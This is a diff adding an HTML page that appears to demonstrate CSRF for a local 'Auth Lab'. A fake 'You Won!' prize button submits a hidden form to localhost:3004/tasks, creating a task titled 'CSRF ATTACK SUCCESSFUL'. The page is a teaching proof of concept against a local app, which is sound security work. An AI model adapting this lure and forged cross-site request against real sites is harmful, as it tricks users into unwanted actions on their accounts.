@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Win a Prize!</title>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0c0a09;
+      color: #e7e5e4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background: #1c1917;
+      padding: 40px;
+      border-radius: 16px;
+      border: 2px solid #f59e0b;
+      text-align: center;
+      max-width: 400px;
+    }
+
+    h1 {
+      color: #f59e0b;
+      margin-top: 0;
+    }
+
+    .prize-btn {
+      background: #f59e0b;
+      color: #1c1917;
+      border: none;
+      padding: 15px 30px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 1.1rem;
+    }
+
+    .note {
+      margin-top: 20px;
+      font-size: 0.8rem;
+      color: #78716c;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h1>You Won! 🎁</h1>
+    <p>Your "Auth Lab" completion reward is ready.</p>
+
+    <form action="http://localhost:3004/tasks" method="POST">
+      <input type="hidden" name="title" value="CSRF ATTACK SUCCESSFUL 💀">
+      <button type="submit" class="prize-btn">CLAIM MY REWARD</button>
+    </form>
+
+    <p class="note">Origin: localhost:3005<br>Target: localhost:3004</p>
+  </div>
+</body>
+
+</html>
